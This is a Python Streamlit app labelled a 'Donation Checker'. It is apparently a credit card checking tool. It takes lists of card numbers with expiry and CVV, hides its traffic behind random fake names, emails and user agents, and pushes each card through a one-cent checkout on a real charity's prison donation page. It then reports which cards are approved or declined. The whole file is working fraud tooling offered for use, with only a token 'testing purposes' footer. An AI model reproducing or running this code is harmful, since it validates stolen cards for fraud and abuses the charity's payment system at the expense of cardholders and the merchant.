import streamlit as st
import requests
import re
import time
import random
import string
from fake_useragent import UserAgent

# Set page configuration
st.set_page_config(
    page_title="Donation Checker",
    page_icon="💰",
    layout="wide"
)

# Custom CSS for better appearance
st.markdown("""
<style>
    .success {
        padding: 10px;
        border-radius: 5px;
        background-color: #d4edda;
        border: 1px solid #c3e6cb;
        color: #155724;
    }
    .error {
        padding: 10px;
        border-radius: 5px;
        background-color: #f8d7da;
        border: 1px solid #f5c6cb;
        color: #721c24;
    }
    .info {
        padding: 10px;
        border-radius: 5px;
        background-color: #cce5ff;
        border: 1px solid #b8daff;
        color: #004085;
    }
</style>
""", unsafe_allow_html=True)

# Application title and description
st.title("💳 Donation Checker")
st.markdown("Enter credit card details to test donations. Format: `XXXXXXXXXXXXXXXX|MM|YY|CVV`")

# Helper function to generate a random email
def generate_random_email():
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    return f"{username}@{random.choice(domains)}"

# Helper function to generate a random name
def generate_random_name():
    first_names = ["John", "Mary", "James", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth"]
    last_names = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

# Helper function to generate a user agent
def generate_user_agent():
    try:
        ua = UserAgent()
        return ua.random
    except:
        # Fallback user agents if the library fails
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        return random.choice(user_agents)

# Function to determine card type based on card number
def get_card_type(card_number):
    if card_number.startswith('4'):
        return 'Visa'
    elif card_number.startswith('5'):
        return 'MasterCard'
    elif card_number.startswith('3'):
        return 'Amex'
    elif card_number.startswith('6'):
        return 'Discover'
    else:
        return 'Unknown'

# Main processing function
def process_donation(cc_data):
    try:
        # Parse card data
        parts = cc_data.strip().split("|")
        if len(parts) < 4:
            return "Error: Invalid card format. Use: XXXXXXXXXXXXXXXX|MM|YY|CVV"
        
        # Extract card details
        cc = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        
        # Format expiration year
        if "20" in yy:
            yy = yy.split("20")[1]
        
        # Create a new session for the requests
        session = requests.Session()
        
        # Generate random user data
        user = generate_user_agent()
        email = generate_random_email()
        name1 = generate_random_name()
        card_type = get_card_type(cc)
        
        # Log what we're about to test
        st.info(f"Testing card: {cc[:6]}XXXXXX{cc[-4:]} | {mm}/{yy} | Type: {card_type}")
        
        # Step 1: Visit the donation page
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'user-agent': user,
        }
        
        req = session.get('https://www.ywampublishing.com/p-1649-prison-donation-project.aspx', headers=headers)
        time.sleep(2)
        
        # Step 2: Add donation to cart
        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'ProductId': '1649',
            'VariantId': '1681',
            'CartRecordId': '0',
            'UpsellProducts': '',
            'ReturnUrl': '/p-1649-prison-donation-project.aspx',
            'IsWishlist': 'false',
            'TextOption': email,
            'CustomerEnteredPrice': '0.01',
        }
        
        req1 = session.post('https://www.ywampublishing.com/minicart/ajaxaddtocart', headers=headers, data=data)
        time.sleep(2)
        
        # Step 3: Update mini cart
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': user,
        }
        
        params = {
            'cartType': 'ShoppingCart',
        }
        
        data = {
            'CartItems[0].Id': '556169',
            'CartItems[0].ProductId': '1649',
            'CartItems[0].VariantId': '1681',
            'CartItems[0].ChosenColorSkuModifier': '',
            'CartItems[0].ChosenSizeSkuModifier': '',
            'CartItems[0].TextOption': email,
            'CartItems[0].Quantity': '1',
            'returnUrl': '/p-1649-prison-donation-project.aspx',
        }
        
        req2 = session.post(
            'https://www.ywampublishing.com/minicart/updateminicart',
            params=params,
            headers=headers,
            data=data,
        )
        time.sleep(2)
        
        # Step 4: Set email
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': user,
        }
        
        data = {
            'Email': email,
        }
        
        req3 = session.post('https://www.ywampublishing.com/checkoutaccount/setemail', headers=headers, data=data)
        time.sleep(2)
        
        # Extract verification token
        token_match = re.search(r'name="__RequestVerificationToken" type="hidden" value="(.*?)"', req3.text)
        if not token_match:
            return "Error: Could not extract verification token"
            
        tokenpayment = token_match.group(1)
        
        # Step 5: Set billing address
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': user,
        }
        
        params = {
            'makePrimary': 'True',
            'addressType': 'Billing',
            'returnurl': '/shoppingcart.aspx',
        }
        
        data = {
            'Address.Id': '',
            'MakePrimary': 'True',
            'Address.Country': 'United States',
            'Address.Name': name1,
            'Address.Phone': '(863) 983-8465',
            'Address.Address1': '532 E Obispo Ave',
            'Address.Address2': '',
            'Address.Suite': '',
            'Address.Company': '',
            'Address.Zip': '33440',
            'Address.City': 'Clewiston',
            'Address.State': 'FL',
        }
        
        req4 = session.post('https://www.ywampublishing.com/address/detail', params=params, headers=headers, data=data)
        time.sleep(2)
        
        # Step 6: Submit credit card
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': user,
        }
        
        data = {
            'Name': name1,
            'Number': cc,
            'CardType': card_type,
            'ExpirationDate': f'{mm} / {yy}',
            'Cvv': cvc,
            'SaveCreditCardNumber': [
                'true',
                'false',
            ],
        }
        
        req5 = session.post(
            'https://www.ywampublishing.com/checkoutcreditcard/creditcard',
            headers=headers,
            data=data,
        )
        time.sleep(2)
        
        # Step 7: Place order
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': user,
        }
        
        data = {
            '__RequestVerificationToken': tokenpayment,
            'OrderNotes': '',
            'OkToEmailSelected': 'false',
        }
        
        req6 = session.post('https://www.ywampublishing.com/checkout/placeorder', headers=headers, data=data)
        time.sleep(2)
        
        # Extract result from response
        error_match = re.search(r'<div class="notice notice-failure">\s*(.*?)\s*</div>', req6.text)
        if error_match:
            result = error_match.group(1)
            return f"DECLINED: {result}"
        
        success_match = re.search(r'<div class="notice notice-success">\s*(.*?)\s*</div>', req6.text)
        if success_match:
            result = success_match.group(1)
            return f"SUCCESS: {result}"
        
        # If neither success nor error match found
        return "UNKNOWN RESPONSE: Unable to determine the result"
    
    except Exception as e:
        return f"Error: {str(e)}"

# Create UI components for input
cc_input = st.text_area("Credit Card Information (one per line)", height=150, 
                        placeholder="4111111111111111|01|25|123\n5111111111111111|02|26|456")

col1, col2 = st.columns(2)
with col1:
    process_button = st.button("Process Cards", type="primary")
with col2:
    clear_button = st.button("Clear Results")

# Initialize or retrieve session state for results
if 'results' not in st.session_state:
    st.session_state.results = {}

# Clear results if requested
if clear_button:
    st.session_state.results = {}
    st.success("Results cleared")

# Process the cards
if process_button and cc_input:
    cards = cc_input.strip().split('\n')
    
    # Create a progress bar
    progress_bar = st.progress(0)
    status_text = st.empty()
    
    for i, card in enumerate(cards):
        if card.strip():
            status_text.text(f"Processing card {i+1} of {len(cards)}...")
            
            # Process the card
            result = process_donation(card.strip())
            
            # Store the result
            st.session_state.results[card] = result
            
            # Update progress
            progress_bar.progress((i + 1) / len(cards))
    
    # Complete the process
    status_text.text("Processing complete!")
    time.sleep(1)
    status_text.empty()
    progress_bar.empty()

# Display results
if st.session_state.results:
    st.subheader("Results")
    
    # Count results by type
    success_count = sum(1 for result in st.session_state.results.values() if result.startswith("SUCCESS"))
    declined_count = sum(1 for result in st.session_state.results.values() if result.startswith("DECLINED"))
    error_count = sum(1 for result in st.session_state.results.values() if result.startswith("Error"))
    
    # Create stats columns
    col1, col2, col3, col4 = st.columns(4)
    col1.metric("Total", len(st.session_state.results))
    col2.metric("Success", success_count)
    col3.metric("Declined", declined_count)
    col4.metric("Errors", error_count)
    
    # Display each result
    for card, result in st.session_state.results.items():
        if result.startswith("SUCCESS"):
            st.markdown(f"""
            <div class="success">
                <strong>{card}</strong><br>
                {result}
            </div>
            """, unsafe_allow_html=True)
        elif result.startswith("DECLINED"):
            st.markdown(f"""
            <div class="error">
                <strong>{card}</strong><br>
                {result}
            </div>
            """, unsafe_allow_html=True)
        else:
            st.markdown(f"""
            <div class="info">
                <strong>{card}</strong><br>
                {result}
            </div>
            """, unsafe_allow_html=True)
        
        st.markdown("---")

# Footer
st.markdown("---")
st.markdown("*This application is for testing purposes only.*")
